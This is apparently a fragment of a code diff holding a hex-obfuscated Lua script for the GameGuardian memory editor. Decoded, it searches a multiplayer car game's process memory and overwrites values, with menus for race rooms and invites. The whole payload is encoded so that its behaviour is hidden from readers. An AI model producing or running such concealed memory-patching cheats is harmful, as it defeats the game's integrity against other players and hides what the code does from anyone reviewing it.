D8175727B1A17816E7B78727F2D4A2D3D85737373737373737373737373737373451A17727980721A17816E7B78727F2D4A2D3D857373737373737373737373737373733D1A17727B711A17797C706E792D707C7D862D4A2D736E7980721A17797C706E792D792D4A2D74743B747281597680815681727A8035361A1776732D7B7C812D707C7D862D8175727B2D74743B7F727A7C8372597680815681727A803579362D727B711A17737C7F2D76392D832D767B2D767D6E767F803579362D717C1A1716833B6E71717F7280802D4A2D833B6E71717F7280802D382D816E7B78727F1A171676732D707C7D862D8175727B2D833B7B6E7A722D4A2D833B7B6E7A723B3B342D303F342D727B711A17727B711A1774743B6E7171597680815681727A803579361A17727B711A171A1773827B7081767C7B2D504E3F6C6E7D7D79866C7C737380728135361A1776732D5472816C8280727F6C767B7D828168416A2D8175727B1A17816E7B78727F2D4A2D3D85737373737373737373737373737373451A17727980721A17816E7B78727F2D4A2D3D857373737373737373737373737373733D1A17727B711A17797C706E792D707C7D862D4A2D736E7980721A17797C706E792D792D4A2D74743B747281597680815681727A8035361A1776732D7B7C812D707C7D862D8175727B2D74743B7F727A7C8372597680815681727A803579362D727B711A17737C7F2D76392D832D767B2D767D6E767F803579362D717C1A1716833B6E71717F7280802D4A2D833B6E71717F7280802D382D816E7B78727F1A171676732D707C7D862D8175727B2D833B7B6E7A722D4A2D833B7B6E7A723B3B342D303F342D727B711A17727B711A1774743B6E7171597680815681727A803579361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D5E6C6E7D7D79866C73768535361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B797C6E715F7280827981803574743B747281597680815681727A803536361A1774743B7079726E7F5976808135361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F5E6C6E7D7D79866C7376852F361A177F7281827F7B2D3D1A17727B711A1786862D4A2D74743B7472815F728082798180353E3D3D3D361A1774743B7079726E7F5F72808279818035361A17762D4A2D3E1A17702D4A2D3E1A17802D4A2D888A1A1784757679722D35763A3E362D492D707C827B812D717C1A17868668766A3B6E71717F7280802D4A2D868668766A3B6E71717F7280802D382D3D856F413D3D3D3D3D3D3D3D3D3D3D3D3D3D1A1774743B80726E7F70755B827A6F727F35868668766A3B6E71717F728080392D74743B61665D526C5E645C5F51361A17707B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D3D2D492D707B812D8175727B1A176F86817F2D4A2D74743B7472815F72808279818035707B81361A177B2D4A2D3E1A1784757679722D357B3A3E362D492D707B812D717C1A178068706A2D4A2D888A1A178068706A3B6E71717F7280802D4A2D6F86817F687B6A3B6E71717F7280801A178068706A3B73796E74802D4A2D403F1A177B2D4A2D7B2D382D3E1A17702D4A2D702D382D3E1A17727B711A17727B711A1774743B7079726E7F5F72808279818035361A17762D4A2D762D382D3E1A17727B711A1774743B6E7171597680815681727A803580361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D4E6C6F6E80726C836E79827235361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B797C6E715F7280827981803574743B747281597680815681727A803536361A1774743B7079726E7F5976808135361A1774743B80726E7F70755D7C767B81727F357C73738081361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F4E6C6F6E80726C836E7982722F361A177F7281827F7B2D3D1A17727B711A178172792D4A2D74743B7472815F72808279818035707C827B81361A1774743B6E7171597680815681727A8035817279361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D4E6C6F6E80726C6E7070827F6E708635361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C62602D892D74743B5F5254565C5B6C506C4E59595C50361A1774743B797C6E715F7280827981803574743B747281597680815681727A803536361A1774743B7079726E7F5976808135361A1774743B80726E7F70755D7C767B81727F357C73738081361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F4E6C6F6E80726C6E7070827F6E70862F361A177F7281827F7B2D3D1A17727B711A17787C792D4A2D74743B7472815F72808279818035707C827B81361A17762D4A2D3E1A17752D4A2D888A1A1784757679722D35763A3E362D492D707C827B812D717C1A177568766A2D4A2D888A1A177568766A3B6E71717F7280802D4A2D787C7968766A3B836E7982721A177568766A3B73796E74802D4A2D403F1A17762D4A2D762D382D3E1A17727B711A1774743B6E7171597680815681727A803575361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D4E6C8280727F6C747683727B6C7C737380728135361A17797C706E792D7C79716C806E83726C797680812D4A2D74743B747281597680815681727A8035361A17737C7F2D76392D832D767B2D767D6E767F80357C79716C806E83726C79768081362D717C1A17833B6E71717F7280802D4A2D833B6E71717F7280802D382D5472816C8280727F6C767B7D8281683F6A1A17833B73796E74802D4A2D5472816C8280727F6C81867D721A17727B711A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1774743B797C6E715F728082798180357C79716C806E83726C79768081361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F5E6C6E7D7D79866C73768538382F361A177F7281827F7B2D3D1A17727B711A1774743B807281637680766F797235817F8272361A17727B711A171A171A171A171A171A1773827B7081767C7B2D80816E7F8135361A178280727F6C767B7D82816C816E78727F35361A175C6C767B7681766E796C80726E7F707535361A175C6C71767B7681766E796C80726E7F707535361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C7D7C767B81727F6C80726E7F707535361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C6E7D7D79866C7C737380728135361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C6F6E80726C836E79827235361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A1776732D7C737380812D4A4A2D3D2D8175727B1A174E6C6F6E80726C6E7070827F6E708635361A17727B711A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C8280727F6C747683727B6C7C737380728135361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A17797C7C7D507572707835361A1776732D727F7F7C7F2D4B2D3D2D8175727B1A177F7281827F7B2D3D1A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D8072707C7B716C80816E7F8135361A1774743B817C6E8081352FFDACACAE595C4E51565B542D472D6072707C7B712D617F862F361A175C6C71767B7681766E796C80726E7F707535361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C7D7C767B81727F6C80726E7F707535361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C6E7D7D79866C7C737380728135361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A175E6C6E7D7D79866C73768535361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A1776732D7C737380812D4A4A2D3D2D8175727B1A174E6C6F6E80726C6E7070827F6E708635361A17727B711A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C8280727F6C747683727B6C7C737380728135361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A17797C7C7D507572707835361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A177F7281827F7B2D3D1A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D8175767F716C80816E7F8135361A1774743B817C6E8081352FFDACA1C1595C4E51565B542D472D6175767F712D617F862F361A175C6C71767B7681766E796C80726E7F707535361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A17504E6C7D7C767B81727F6C80726E7F707535361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A1776732D7C737380812D4A4A2D3D2D8175727B1A17504E3F6C6E7D7D79866C7C737380728135361A17727B711A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C6F6E80726C836E79827235361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A1776732D7C737380812D4A4A2D3D2D8175727B1A174E6C6F6E80726C6E7070827F6E708635361A17727B711A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A174E6C8280727F6C747683727B6C7C737380728135361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A17797C7C7D507572707835361A1776732D727F7F7C7F2D4B2D3F2D8175727B1A177F7281827F7B2D3D1A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D737C827F81756C80816E7F8135361A1774743B817C6E8081352FEFA5AFFCC59C595C4E51565B542D472D537C827F81752D617F862F361A175C6C71767B7681766E796C80726E7F707535361A17504E6C7D7C767B81727F6C80726E7F707535361A17504E3F6C6E7D7D79866C7C737380728135361A175E6C6E7D7D79866C73768535361A1776732D7C737380812D4A4A2D3D2D8175727B1A174E6C6F6E80726C6E7070827F6E708635361A17727B711A174E6C8280727F6C747683727B6C7C737380728135361A17797C7C7D507572707835361A17727B711A171A171A171A171A171A171A171A1773827B7081767C7B2D625635361A1774743B80757C8462764F8281817C7B35361A1784757679722D817F82722D717C1A1776732D74743B76805079767078727162764F8281817C7B35362D8175727B1A1780816E7F8135361A17727B711A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D80817C7D50797C807235361A1784757679722D817F82722D717C1A177A6E767B5A727B8235361A1774743B807281637680766F797235736E798072361A1784757679722D74743B7680637680766F797235362D4A4A2D736E7980722D717C1A17727B711A17727B711A17727B711A171A171A171A1776732D7D7F7C747F6E7A2D4A4A2D3F2D8175727B1A1780817C7D50797C807235361A17727980721A17625635361A17727B71'))
+local data = encodes(v_value[1],'1A1776732D74743B6E79727F81352FF7A1C9EFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EF7A58E697BFDAC94BBFDAC94B62DFDAA9D9FFDAA9D8FFDAA9D9EFDAA9D95FDAA9D9CFDAA9DA02DFDAA9D8EFDAA9DA52D5C5967554E602DFDAC94BBFDAC94B6697BF7A1C9EFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EF7A58E697BFDAA9D9BFDAA9DA3FDAA9D9AFDAA9D91FDAA9D9E2D472D4D5F5C545F4E5A697BEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18E697BFDAA9D8DFDAA9DB6FDAA9DB62DFDAA9DB4FDAA9DA7FDAA9DB3FDAA9DAB2D472D2F2D3B3B2D74743B747281616E7F747281567B737C3536682F796E6F72792F6A2D3B3B2D2F2D697BFDAA9DA2FDAA9DABFDAA9DB8FDAA9DB9FDAA9DAFFDAA9DB5FDAA9DB42D472D2F2D3B3B2D74743B747281616E7F747281567B737C3536682F83727F80767C7B5B6E7A722F6A2D3B3B2D2F2D682F2D3B3B2D74743B747281616E7F747281567B737C3536682F83727F80767C7B507C71722F6A2D3B3B2D2F6A697BFDAA9D9FFDAA9DA9FDAA9DB8FDAA9DAFFDAA9DB6FDAA9DBA2DFDAA9DA2FDAA9DABFDAA9DB8FDAA9DB9FDAA9DAFFDAA9DB5FDAA9DB42D472DFDAA9DA2FDAA9DA2FDAA9D95FDAA9D9C38697B3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A3A697B2F2D3B3B2D2F2F392D2FFDAC92CBFDAC92C72F392D2FFDAC92C1FDAC9394FDAC92C5FDAC93902F362D8B4A2D3E2D8175727B1A1774743B807281637680766F797235736E798072361A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1774743B807972727D353F3D3D361A1774743B817C6E8081352F565B515C5B5260564E5B2F361A1774743B7079726E7F5F728082798180353674743B7079726E7F5976808135361A177D7F767B81357C803B716E8172352FFDAC91C0FDAC91CBFDAC91CAFDAC9290CFADFDAC91C2FDAC91CBFDAC928EFDAC91C3FDAC91C1FDAC9290CFADFDAC9290FDAC91CBCFADFDAC928FFDAC9291FDAC91BEFDAC928FFDAC91BFFDAC928EFDAC91C5FDAC91BEFDAC91C1CFADFDAC91BEFDAC928EFDAC91CB697B697BEF9CBEFCC59C2D617C716E862D472D32663C327A3C32712D61767A72472D325547325A4732602DEF9CBEFCC59C697B697B2F36361A177D7F767B81352F2D2D2D2D2D2D2D2DEFABB42DEFA095EFA09FEFA0AEEFA0A5EFA0ACEFA0B02DEFABAD697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D5D5F5C545F4E5A2D4F52614E2D2D2D472D504E5F2D5D4E5F58565B54697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DFDAAA1CAEF91AAFDAAA293FDAAA2912DFDAAA28DEF91A2FDAAA1C8FDAAA293EF91A2FDAAA1C9FDAAA297FDAAA28DFDAAA1C52D2D2D2D2D472DFDAC94BBFDAC94B6697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DEFA18EEFA18DEFA18EEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEDC9C7EEC19485D6B7EEC1A8EDC9C8EFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18EEFA18DEFA18E2F362D2D1A1774743B807972727D35423D3D361A1774743B807281637680766F797235817F8272361A172D2D7C803B7285768135361A172D2D727B711A171A177D7F7C747F6E7A2D4A2D3F2D1A171A1774743B817C6E8081352F5D5F5260602D54542D595C545C2F361A171A171A171A171A171A1773827B7081767C7B2D7A6E767B5A727B8235361A1774743B807281637680766F797235736E798072361A17797C706E792D8072816376804A74743B807281637680766F79721A17797C706E792D76806376804A74743B7680637680766F79721A17797C706E792D80757C847A727B824A736E7980721A1780728163768035736E798072361A171A1784757679722D817F82722D717C1A172D2D2D2D76732D768063768035362D4A4A2D817F82722D8175727B1A172D2D2D2D2D2D80757C847A727B824A817F82721A172D2D2D2D2D2D80728163768035736E798072361A172D2D2D2D727B711A172D2D2D2D76732D80757C847A727B824A4A817F82722D8175727B1A172D2D2D2D2D2D80757C847A727B824A736E7980721A1773767F80815A727B822D4A2D74743B7A8279817650757C76707235882F5B4E5B2D615C64565B542F392F5B5C5F5A4E592D332D4E50615663522F392FEFAA9952655661EFAA992F8A397B7679392F507F726E812D4F862D7D7F7C747F6E7A6C6F72816E2F361A1776732D73767F80815A727B822D4A4A2D7B76792D8175727B1A1774743B817C6E8081352F697BEFA7ADFCC59CFDAA9D9FFDAA9DA9FDAA9DB8FDAA9DAFFDAA9DB6FDAA9DBA2DFDAA9DA8FDAA9DBF2D472D7D7F7C747F6E7A2D6F72816EEFA7ADFCC59C697B2D697BFDAAA78FFDAAA791FDAAA6BEFDAAA78FFDAAA6BFFDAAA78EFDAAA6C5FDAAA6BEFDAAA6C12DFDAAA6C2FDAAA6CBFDAAA78E2DFDAAA6C9FDAAA6CBFDAAA78EFDAAA6C12DFDAAA78FFDAAA6BFFDAAA78EFDAAA6C5FDAAA6CCFDAAA7902DFDAAA6C4FDAAA6BDFDAAA6BFFDAAA6C72DFDAAA791FDAAA6CCFDAAA6C0FDAAA6BDFDAAA790FDAAA6C1FDAAA78F2F361A177A6E767B5A727B8235361A17727B711A1776732D73767F80815A727B82683E6A2D8175727B1A177075726E816C3E35361A17727B711A1776732D73767F80815A727B82683F6A2D8175727B1A1780826F5A727B8235361A17727B711A1776732D73767F80815A727B8268406A2D8175727B1A1780728163768035736E798072361A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1774743B807972727D353F3D3D361A1774743B817C6E8081352FFDAA9DA02F361A1774743B817C6E8081352F7D7F7C747F6E7A2D6F72816E2F361A1774743B7079726E7F5F728082798180353674743B7079726E7F5976808135361A177D7F767B81357C803B716E8172352FFDAC91C0FDAC91CBFDAC91CAFDAC9290CFADFDAC91C2FDAC91CBFDAC928EFDAC91C3FDAC91C1FDAC9290CFADFDAC9290FDAC91CBCFADFDAC928FFDAC9291FDAC91BEFDAC928FFDAC91BFFDAC928EFDAC91C5FDAC91BEFDAC91C1CFADFDAC91BEFDAC928EFDAC91CB697B697BEF9CBEFCC59C2D617C716E862D472D32663C327A3C32712D61767A72472D325547325A4732602DEF9CBEFCC59C697B697B2F36361A177D7F767B81352F2D2D2D2D2D2D2D2DEFABB42DEFA095EFA09FEFA0AEEFA0A5EFA0ACEFA0B02DEFABAD697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DFDAAA29DFDAAA293FDAAA299FDAAA298FDAAA299FDAAA1C6FDAAA1C92DEF918FEF919AFDAAA1C5EF91A2EF91A2FDAAA1C9FDAAA2902D2D2D472D706E7F2D7D6E7F78767B74697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DFDAAA1CAEF91AAFDAAA293FDAAA2912DFDAAA28DEF91A2FDAAA1C8FDAAA293EF91A2FDAAA1C9FDAAA297FDAAA28DFDAAA1C52D2D2D2D2D472DFDAC94BBFDAC94B6697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DEFA18EEFA18DEFA18EEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEDC9C7EEC19485D6B7EEC1A8EDC9C8EFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18EEFA18DEFA18E2F362D2D1A1774743B807972727D35423D3D361A1780728163768035817F8272362D1A177C803B7285768135361A17727B711A17727B711A17727B711A17727B711A171A171A1773827B7081767C7B2D7075726E816C3E35361A177D7F7C747F6E7A81352F5A82798176517F6E745F6E70767B74507C7B817F7C79792F392D2F3D8553502F392D736E798072392D736E798072392D74743B61665D526C53595C4E61361A1774743B7472815F7280827981803546464646361A17797C706E792D812D4A2D74743B7472815F728082798180353F361A172D2D2D74743B6E7171597680815681727A803581361A172D2D2D2D2D2D2D812D4A2D7B76791A172D2D2D2D2D2D2D74743B807281637680766F797235736E798072362D2D2D2D2D2D1A172D2D2D2D2D2D2D2D2D2D7F7283727F812D4A2D74743B747281597680815681727A8035361A17797C706E792D812D4A2D74743B747281597680815681727A8035361A17737C7F2D76392D832D767B2D767D6E767F803581362D717C1A171676732D833B73796E74802D4A4A2D74743B61665D526C53595C4E612D8175727B1A171616833B836E7982722D4A2D2F42424242422F1A171616833B737F727287722D4A2D736E7980721A171616833B737F7272877261867D722D4A2D74743B535F525267526C5B5C5F5A4E591A1716727B711A17727B711A1774743B6E7171597680815681727A803581361A17812D4A2D7B76791A171A177C2D4A2D74743B7472815F728082798180353E361A171A17797C706E792D6F2D4A2D888A1A176F683E6A2D4A2D888A1A176F683E6A3B6E71717F7280802D4A2D7C683E6A3B6E71717F7280802D382D3D85403D1A176F683E6A3B73796E74802D4A2D74743B61665D526C53595C4E611A176F683E6A3B836E7982722D4A2D453D45451A176F683E6A3B737F727287722D4A2D817F82721A1716166F683E6A3B737F7272877261867D722D4A2D74743B535F525267526C5B5C5F5A4E591A1774743B807281636E79827280356F362D1A1774743B6E7171597680815681727A80356F361A176F2D4A2D7B76791A1774743B7D7F7C707280805F7280827A7235361A171A17782D4A2D74743B7472815F728082798180353E361A171A17797C706E792D792D4A2D888A1A1779683E6A2D4A2D888A1A1779683E6A3B6E71717F7280802D4A2D78683E6A3B6E71717F7280802D382D3D853F411A1779683E6A3B73796E74802D4A2D74743B61665D526C53595C4E611A1779683E6A3B836E7982722D4A2D3D1A1779683E6A3B737F727287722D4A2D817F82721A17161679683E6A3B737F7272877261867D722D4A2D74743B535F525267526C5B5C5F5A4E591A1774743B807281636E798272803579362D1A1774743B6E7171597680815681727A803579361A17792D4A2D7B76791A1774743B7D7F7C707280805F7280827A7235361A171A171A17842D4A2D74743B7472815F728082798180353E361A171A17797C706E792D7E2D4A2D888A1A177E683E6A2D4A2D888A1A177E683E6A3B6E71717F7280802D4A2D84683E6A3B6E71717F7280802D382D3D853E451A177E683E6A3B73796E74802D4A2D74743B61665D526C53595C4E611A177E683E6A3B836E7982722D4A2D3A464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646461A177E683E6A3B737F727287722D4A2D817F82721A1716167E683E6A3B737F7272877261867D722D4A2D74743B535F525267526C5B5C5F5A4E591A1774743B807281636E79827280357E362D1A1774743B6E7171597680815681727A80357E361A177E2D4A2D7B76791A1774743B7079726E7F5F72808279818035361A1774743B807281637680766F797235736E798072361A1774743B817C6E8081352FFDAA9D8DFDAA9DA9FDAA9DBAFDAA9DAFFDAA9DBCFDAA9DA7FDAA9DBAFDAA9DAB2F361A1780826F5A727B8235361A1774743B817C6E8081352F7D7F7280802D54542D597C747C2F361A17727B711A171A1773827B7081767C7B2D80826F5A727B8235361A1774743B807281637680766F797235736E798072361A17797C706E792D8072816376804A74743B807281637680766F79721A17797C706E792D76806376804A74743B7680637680766F79721A17797C706E792D80757C847A727B824A736E7980721A1780728163768035736E798072361A171A171A1784757679722D817F82722D717C1A172D2D76732D74743B7680637680766F797235364A4A736E7980722D8175727B1A172D2D2D2D7C7F71727F4A74743B6E79727F81352FFDAA9D8FFDAA9DB8FDAA9DABFDAA9DA7FDAA9DBA2DFDAA9DA8FDAA9DBF2D472D7C7987756E802D746E7A722F392F4E708176836E81722F392F5B7C7F7A6E792F361A172D2D2D2D76732D7C7F71727F2D4A4A2D3E2D8175727B2D1A172D2D2D2D2D2D747C817C2D706E6E7F761A172D2D2D2D7279807276732D7C7F71727F2D4A4A2D3F2D8175727B1A172D2D2D2D747C817C2D7B7C7F7A6E791A172D2D2D2D727B711A172D2D727B711A17727B711A171A174747706E6E7F7647472D717C1A1774743B7079726E7F5F72808279818035361A1774743B2D8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B2D7079726E7F5F72808279818035361A1774743B80726E7F70755B827A6F727F352F3D3B4341443D423D3D3F403D45483D3B46443D3D3D3D3D3F45433E483E3B4445443D464340453E3E46483D3B42423D414342453F3F3F3F4740402F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A1774743B7F7273767B725B827A6F727F352F3D3B4341443D423D3D3F403D452F3974743B61665D526C53595C4E61361A177F7283727F812D4A2D74743B7472815F728082798180354646464646392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F4046452F392D74743B61665D526C53595C4E61361A171A1774743B817C6E8081352F5D5F5C545F4E5A2D7D7F7C747F6E7A2D505C594E4F2D515F4E542F361A1774743B807972727D35463D3D361A1774743B6E79727F81352F4E5F522D665C622D60625F522D4F5F5C6155525F2D545C2F361A1774743B807972727D353E3D3D361A1774743B6E79727F81352F4E5F522D665C622D5F524E51662F361A1774743B807972727D353F3D3D361A1774743B6E79727F81352F595C4E51565B542D535F4E5A522D5F4E50522D5F5C5C5A2F361A1774743B807972727D35403D3D361A1774743B7079726E7F5F72808279818035361A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D362D1A1774743B80726E7F70755B827A6F727F352F423D3D2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3A3F2F392D74743B61665D526C53595C4E61361A1774743B807972727D353F3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F423D3D2F392D74743B61665D526C53595C4E61361A1774743B7D7F7C707280805F7280827A7235361A1774743B7079726E7F5F72808279818035361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D361A1774743B80726E7F70755B827A6F727F352F3F3B3F3D3D3D3D3D3D4144434553483D3B3D42414646464646464453483E3B3D4241464646464144424253483F3B413D3D3D3D3D3D4642404453473E402F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A171A1774743B7F7273767B725B827A6F727F352F3F3B3F2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F7280827981803546464646392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F42422F392D74743B61665D526C53595C4E61361A1774743B7079726E7F5F72808279818035361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D361A1774743B80726E7F70755B827A6F727F352F3D3B3D3D3D3D3E2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F422F392D74743B61665D526C53595C4E61361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3D3B3D3D3D3D3E2F392D74743B61665D526C53595C4E61361A1774743B7079726E7F5F72808279818035361A1774743B7D7F7C707280805F7280827A7235361A1774743B817C6E8081352F5F524E51662D5F4E50522D2D4F5F5C6155525F2F361A1774743B807972727D35423D3D361A1774743B6E79727F81352F545C3B3B2D615C3B3B3B2D565B635661523B3B3B2D5F4E50523B3B3B2D4F5F5C6155525F3B3B3B2D5B5C6464642F361A1774743B807972727D353E423D3D361A171A1774743B6E79727F81352F2D2D2D2D2D2D2D2D2D2D2DEFA19CEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA1A0697B697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D565B635661522D5F4E50522D4F5F5C6155525F2D5D5F5C545F4E5A2D4F52614E697B697B697B2D2D2D2D2D2D2D2D2D2D2DEFA1A4EFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA1A82F392FFDAAA6BDFDAAA6BFFDAAA790FDAAA6C5FDAAA792FDAAA6BDFDAAA790FDAAA6C12F361A1774743B817C6E8081352FFDAA9D8DFDAA9DA9FDAA9DBAFDAA9DAFFDAA9DBCFDAA9DA7FDAA9DBAFDAA9DAB2F361A1774743B807972727D35463D3D361A1774743B817C6E8081352FFDAA9D9FFDAA9DA9FDAA9DB8FDAA9DAFFDAA9DB6FDAA9DBA2DFDAA9DA8FDAA9DBF2D472D7C7987756E802D746E7A722F361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B80726E7F70755B827A6F727F352F423D3B41454446464546433F41484246413B41444646453D4143454442483D3B443D443E3D43453F454346483D3B443D443E3D43453F454346483E413B3F4544423D3D40453E4144483E413B3F4544423D3D40453E4144483E3B3D4740442F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A1774743B7F7273767B725B827A6F727F352F3E2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A171A17797C706E792D812D4A2D74743B7472815F72808279818035423D3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3A3E3B3D462F392D74743B61665D526C53595C4E61361A1774743B7D7F7C707280805F7280827A7235361A177A6E767B5A727B8235361A17727B711A171A172D1A1747477B7C7F7A6E7947472D717C1A1776732D7F7283727F812D8B4A2D7B76792D8175727B2D74743B807281636E79827280357F7283727F81362D727B711A1774743B7079726E7F5F72808279818035361A1774743B817C6E8081352F5D5F5C545F4E5A2D7D7F7C747F6E7A2D505C594E4F2D515F4E542F361A1774743B807972727D35463D3D361A1774743B6E79727F81352F4E5F522D665C622D60625F522D4F5F5C6155525F2D545C2F361A1774743B807972727D353E3D3D361A1774743B6E79727F81352F4E5F522D665C622D5F524E51662F361A1774743B807972727D353F3D3D361A1774743B6E79727F81352F595C4E51565B542D535F4E5A522D5F4E50522D5F5C5C5A2F361A1774743B807972727D35403D3D361A1774743B7079726E7F5F72808279818035361A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D362D1A1774743B80726E7F70755B827A6F727F352F423D3D2F392D74743B61665D526C53595C4E61392D736E798072392D74743B